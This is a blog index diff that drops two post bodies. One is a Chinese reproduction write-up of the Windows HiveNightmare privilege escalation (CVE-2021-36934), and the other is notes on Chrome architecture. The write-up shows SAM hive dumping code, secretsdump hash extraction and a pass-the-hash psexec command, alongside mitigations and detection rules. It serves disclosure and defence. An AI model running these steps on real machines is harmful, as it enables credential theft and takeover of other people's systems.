@@ -97,72 +97,13 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <span id="more"></span>
-
-<p>本来发在团队公众号上的，结果由于特殊原因不得不撤掉，就发在博客上吧，挺久了。。</p>
+        <p>本来发在团队公众号上的，结果由于特殊原因不得不撤掉，就发在博客上吧，挺久了。。</p>
 <h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>​        该漏洞是由于Windows对多个系统文件（包括安全账户管理器(SAM)）的访问控制列表（ACL）过于宽松所导致的特权提升漏洞。成功利用此漏洞的攻击者可以将普通用户权限提升至SYSTEM权限，并在目标机器上执行任意代码，从而达到控制目标系统的目的。该漏洞存在一定的前置利用条件，需要目标系统开启系统保护，并设置了系统还原点才可进行攻击。如果Win10 C盘大于128G保护模式会默认开启，并进行还原点备份，exp会从这个备份的卷影dump sam文件从而进行利用。</p>
-<p>风险等级：</p>
-<img src="https://pic.imgdb.cn/item/60fdeae15132923bf8f4ebfe.png" alt="1" style="zoom:80%;" />
-
-<p>影响版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Windows Server, version 20H2 (Server Core Installation)</span><br><span class="line">Windows 10 Version 20H2 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 20H2 for 32-bit Systems</span><br><span class="line">Windows 10 Version 20H2 for x64-based Systems</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br><span class="line">Windows 10 Version 2004 for x64-based Systems</span><br><span class="line">Windows 10 Version 2004 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 2004 for 32-bit Systems</span><br><span class="line">Windows 10 Version 21H1 for 32-bit Systems</span><br><span class="line">Windows 10 Version 21H1 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 21H1 for x64-based Systems</span><br><span class="line">Windows 10 Version 1909 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 1909 for x64-based Systems</span><br><span class="line">Windows 10 Version 1909 for 32-bit Systems</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows 10 Version 1809 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 1809 for 32-bit Systems</span><br><span class="line">Windows 10 Version 1809 for x64-based Systems</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>使用Admin权限执行该命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls c:\Windows\System32\Config\SAM</span><br></pre></td></tr></table></figure>
-
-<p>如果输出<code>BUILTIN\USERS:(I)(RX)</code>则漏洞存在。</p>
-<img src="https://pic.imgdb.cn/item/60fdeaf55132923bf8f5107a.png" alt="2" style="zoom: 80%;" />
-
-<p>Jonas L在win11中发现权限访问问题，非管理员用户可以访问c:\Windows\System32\config\下的敏感配置，这其中包括了SAM这些凭证信息。作为非管理员通过这个权限问题，可以读取出管理的hash凭证。在内网中，我们便可以进行哈希传递这些横向移动。</p>
-<img src="https://pic.imgdb.cn/item/60fdeb0e5132923bf8f53c46.png" alt="E6rsUghWYAgHD1d"  /> 
-
-<p>(使用FileTest来读取文件，通过createfile函数获取到sam的handle后，通过readfile来读取文件)</p>
-<p>下载并运行exp, 读取SAM, SYSTEM, SECURITY hives。</p>
-<img src="https://pic.imgdb.cn/item/60fdeb255132923bf8f56532.png" alt="2" style="zoom:80%;" />
-
-<p>   出现了三个新文件。</p>
-<p>​    <img src="https://pic.imgdb.cn/item/60fdeb365132923bf8f58420.png" alt="3" style="zoom:80%;" /></p>
-<p>将这三个文件拖入kali，使用impacket中的secretsdump.py拿到管理员账户的hash。</p>
-<p><img src="https://pic.imgdb.cn/item/60fdeb4c5132923bf8f5ac6a.png" alt="4"></p>
-<p>再用psexec.py打开目标主机cmd，然后为所欲为。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes 管理员账户hash administrator@目标主机ip cmd.exe</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x03-EXP分析"><a href="#0x03-EXP分析" class="headerlink" title="0x03 EXP分析"></a>0x03 EXP分析</h2><p>   （好像也没啥可分析的.）</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//解决无法访问正在使用的SAM问题</span></span><br><span class="line">        hfile = <span class="built_in">CreateFile</span>(fullPath, GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
-
-<p>然后主要就三段代码读取和转储SAM, SECURITY和SYSTEM.</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">  wcout &lt;&lt; <span class="string">L&quot;\nHiveNightmare v0.5 - dump registry hives as non-admin users\n\nSpecify maximum number of shadows to inspect with parameter if wanted, default is 15.\n\nRunning...\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    HANDLE hFile;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置要读取敏感文件位置</span></span><br><span class="line">    TCHAR samLocation[] = <span class="string">L&quot;Windows\\System32\\config\\SAM&quot;</span>;</span><br><span class="line">    TCHAR securityLocation[] = <span class="string">L&quot;Windows\\System32\\config\\SECURITY&quot;</span>;</span><br><span class="line">    TCHAR systemLocation[] = <span class="string">L&quot;Windows\\System32\\config\\SYSTEM&quot;</span>;</span><br><span class="line">    TCHAR fileTime[<span class="number">200</span>];</span><br><span class="line">    TCHAR fileName[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">hFile = <span class="built_in">getVssFileHandle</span>(samLocation, searchDepth);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        wcout &lt;&lt; <span class="string">&quot;Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">//读取Windows\System32\config\SAM失败的错误处理</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">getFileTime</span>(hFile, fileTime, <span class="number">200</span>);</span><br><span class="line">        <span class="built_in">swprintf_s</span>(fileName, <span class="string">L&quot;SAM-%s&quot;</span>, fileTime); <span class="comment">//buggy if name too long</span></span><br><span class="line">        <span class="built_in">dumpHandleToFile</span>(hFile, fileName);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hFile);  <span class="comment">//操作结束,关闭文件句柄</span></span><br><span class="line">        wcout &lt;&lt; endl &lt;&lt; <span class="string">L&quot;Success: SAM hive from &quot;</span> &lt;&lt; fileTime &lt;&lt; <span class="string">L&quot; written out to current working directory as &quot;</span> &lt;&lt; fileName &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//下面就是跟读取SAM一样的步骤,去读取SECURITY和SYSTEM</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-缓解措施"><a href="#0x04-缓解措施" class="headerlink" title="0x04 缓解措施"></a>0x04 缓解措施</h2><p>目前微软官方暂未发布安全更新，建议用户通过临时缓解方法进行防护。</p>
-<p>临时缓解方法：</p>
-<ol>
-<li>限制对 %windir%\system32\config 内容的访问</li>
-</ol>
-<p>以管理员身份打开命令提示符或 Windows PowerShell，运行以下命令：</p>
-<p>icacls %windir%\system32\config*.* /inheritance:e</p>
-<ol start="2">
-<li>删除卷影复制服务 (VSS) 卷影副本</li>
-</ol>
-<p>删除限制访问 %windir%\system32\config 之前存在的任何系统还原点和卷影卷。创建一个新的系统还原点（如果需要）。</p>
-<p>注：变通办法的影响删除卷影副本可能会影响还原操作，包括使用第三方备份应用程序还原数据的能力。必须限制访问并删除卷影副本以防止利用该漏洞。</p>
-<ol start="3">
-<li><p>运行修复脚本</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1">https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1</a></p>
-</li>
-</ol>
-<h2 id="0x05-检测"><a href="#0x05-检测" class="headerlink" title="0x05 检测"></a>0x05 检测</h2><p>使用EDR工具进行检测</p>
-<p>Microsoft Defender for Endpoint</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/ThreatHunting/blob/master/AdvancedHuntingQueries/CVE-2021-36934-HiveNightmare-Defender.ahq">ThreatHunting/CVE-2021–36934-HiveNightmare-Defender.ahq at master · GossiTheDog/ThreatHunting (github.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://security.microsoft.com/hunting?query=H4sIAAAAAAAEAKWNwQrCQAxE51zwH5b-h4ei7VVRf6DUtS0stthQEfx4X1Pw5E2W7CSTmcxeUbN6NWBJF3WXaVLQm3qqg3lQQQUaQzmguOil0dktLyjXgd2qLZQcTScwqaaLun79S5rhz39kVFxPaJf56M4OtvFMY-7ByfPObGqUA_4d_-gXN8r-uLlyN5iW6QPURz47GgEAAA&runQuery=true&timeRangeId=week">M365 Defender query link</a></p>
-<p>Mcafee EDR block rule</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/ThreatHunting/blob/master/EDR-BlockRules/CVE-2021-36934-HiveNightmare-Mcafee">ThreatHunting/CVE-2021–36934-HiveNightmare-Mcafee at master · GossiTheDog/ThreatHunting (github.com)</a></p>
-<p>Azure Sentinel</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/ThreatHunting/blob/master/AdvancedHuntingQueries/CVE-2021-36934-HiveNightmare-Sentinel-Events">ThreatHunting/CVE-2021–36934-HiveNightmare-Sentinel-Events at master · GossiTheDog/ThreatHunting (github.com)</a></p>
-<h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p><a target="_blank" rel="noopener" href="https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5">https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5</a></p>
-<p><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/HiveNightmare/">https://github.com/GossiTheDog/HiveNightmare/</a></p>
-<p>小声bb：感觉实际利用场景不太大，除非结合诱导下载之类的。。（社工yyds）</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2021/12/19/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2021-36934(HiveNightmare)%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -206,57 +147,12 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <span id="more"></span>
-
-<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>Recently, I’ve started to learn browser fuzzing and this is where I keep basic browser stuff. I will keep updating if I’ve learned something new. My goal here is to get familiar with browser programming model. Hopefully I can begin to learn how to fuzz browsers as soon as possible.</p>
-<h2 id="Chrome-University-Notes"><a href="#Chrome-University-Notes" class="headerlink" title="Chrome University Notes"></a>Chrome University Notes</h2><p>To have an overall understanding of the browser, I’ve decided to take a look at of <a target="_blank" rel="noopener" href="https://www.youtube.com/playlist?list=PLNYkxOF6rcICgS7eFJrGDhMBwWtdTgzpx">Chrome University</a> </p>
-<h3 id="The-history-of-the-web"><a href="#The-history-of-the-web" class="headerlink" title="The history of the web"></a>The history of the web</h3><p>This video is mainly about the speaker’s work experience. It’s better to watch the video because the speaker’s humor makes the chapter more accessible.</p>
-<p><strong>Mosaic–&gt;IE–&gt;Chrome</strong></p>
-<p><strong>Chromium</strong>: Fast, seamless, safe, and reliable computing experiences accessible for all. </p>
-<h3 id="Anatomy-of-the-browser-101"><a href="#Anatomy-of-the-browser-101" class="headerlink" title="Anatomy of the browser 101"></a>Anatomy of the browser 101</h3><p><strong>Core principles</strong>: speed, security, simplicity and stability.</p>
-<h4 id="Chrome-at-Launch"><a href="#Chrome-at-Launch" class="headerlink" title="Chrome at Launch"></a>Chrome at Launch</h4><h5 id="Chrome1-0-multi-process-architecture"><a href="#Chrome1-0-multi-process-architecture" class="headerlink" title="Chrome1.0(multi-process architecture)"></a>Chrome1.0(multi-process architecture)</h5><p>​        <strong>Browser</strong>: UI, networking, storage.</p>
-<p>​        <strong>Plugin</strong>: NPAPI(Netscape Plugin Application Programming Interface).</p>
-<p>​        <strong>Renderer</strong>(sandboxed): Webkit.</p>
-<p>​        (They talked to each other through IPC.)</p>
-<p><strong>IPC</strong>: inter-process communication, message passing/shared memory, between processes of different privileges.</p>
-<p><strong>Sandboxing</strong>(platform-specific, multi-level): untrusted data–&gt;locked-down process.</p>
-<p><strong>Plugin Process</strong>: work with existing plugins, ran Flash/Java/reader, unsandboxed.</p>
-<p><strong>Browser Process</strong>: central coordinator, owns browser state(profile data, settings), draws UI, handles networking, can’t trust renderer.</p>
-<p><strong>Threads</strong>: child processes: a main thread, an IPC thread</p>
-<p>​                  browser processes: browser threads(UI, IO, files)</p>
-<h4 id="Present-Chrome"><a href="#Present-Chrome" class="headerlink" title="Present Chrome"></a>Present Chrome</h4><h5 id="Chrome-Today"><a href="#Chrome-Today" class="headerlink" title="Chrome Today"></a>Chrome Today</h5><p>​        <strong>GPU</strong>(partial sandboxed): compositing, scrolling</p>
-<p>​        <strong>Browser</strong>: UI, networking, storage</p>
-<p>​        <strong>Utility</strong>(sandboxed)</p>
-<p>​        <strong>Renderer</strong>(sandboxed): Blink</p>
-<p>​        <strong>Plugin</strong>(sandboxed)</p>
-<p>​        <strong>Extension</strong>(sandboxed)          </p>
-<p><strong>GPU Process</strong>: expensive GPU readback, large project, separate process.</p>
-<p><strong>Utility Process</strong>: more features–&gt;new class of untrusted data(installing an extension, processing JSON), short-lived.</p>
-<p><strong>Extension Process</strong>: work well with the core principles.</p>
-<p><strong>Pepper Plugins</strong>: exploits through plugin code(Flash&amp;PDF), difficult to create sandboxed plugin API, ported Flash, PDFium.</p>
-<p><strong>Chrome/content split</strong>: separate Chrome from the platform, src/chrome–&gt;<strong>src/chrome</strong>(UI, browser features)&amp;<strong>src/content</strong>(multi-process sandboxed platform)–&gt;new products(on the top of content).</p>
-<p><strong>Componentization</strong>: IOS(Safari’s web engine), share code with platform that doesn’t use Blink, split feature code from src/chrome to <strong>src/components</strong>.</p>
-<p><strong>Site Isolation</strong>: run parts of a tab in different processes.</p>
-<p><strong>Mojo</strong>: new IPC mechanism, IDL based, generation of bindings, hides details of which process the caller and callee run in.</p>
-<p><strong>Mojo Primitives</strong>: message pipes, shared buffers, data pipes, process/thread agnostic.</p>
-<h4 id="Future-Chrome"><a href="#Future-Chrome" class="headerlink" title="Future Chrome"></a>Future Chrome</h4><h5 id="Servicification"><a href="#Servicification" class="headerlink" title="Servicification"></a>Servicification</h5><p>upgrade(improve Chrome’s principles)</p>
-<p>microservice architecture(well-defined, reusable, decoupled, layered system)</p>
-<p>Servicification Benefits: core principles</p>
-<p>Servicification Process Model: All the processes are sandboxed except Browser.(partial sandboxed: Devices and GPU)</p>
-<h3 id="Anatomy-of-the-browser-201"><a href="#Anatomy-of-the-browser-201" class="headerlink" title="Anatomy of the browser 201"></a>Anatomy of the browser 201</h3><p>The Browser Process</p>
-<p>//chrome–&gt;//content</p>
-<p>a browser process: Utility rprocesses, GPU processes, Renderers… </p>
-<p>major objects: BrowserProcess, content::BrowserMainLoop, content::BrowserMainParts, ChromeBrowserMainParts</p>
-<p>OffTheRecordProfile–&gt;Profile–&gt;content::BrowserContext–&gt;base::SupportsUserData::Data &amp; KeyedService&lt;–BrowserContextKeyedServiceFactory</p>
-<p>WebContentsObserver–&gt;WebContents–&gt;(owns)WebContentsUserData</p>
-<p>WebContents–&gt;(calls)WebContentsDelegate&lt;–(implements)Browser</p>
-<p>RenderFrameHost(Browser, Content)–&gt;RenderFrame(Renderer, Content)–&gt;WebLocalFrame(Blink)–&gt;LocalFrame(Blink)</p>
-<p>multiple renderer processes</p>
-<p>Profile: History, Bookmarks, Passwords</p>
-<p>​              Default Storage Partition: Cookies, Local Storage, IndexedDB</p>
-<p>​              Other Storage Partitions: Cookies, Local Storage, IndexedDB</p>
-<p>to be continued…</p>
-
+        <h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>Recently, I’ve started to learn browser fuzzing and this is where I keep basic browser stuff. I will keep updating if I’ve learned something new. My goal here is to get familiar with browser programming model. Hopefully I can begin to learn how to fuzz browsers as soon as possible.</p>
+        
+          <p class="article-more-link">
+            <a href="/2021/12/19/Browser%20Basics/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
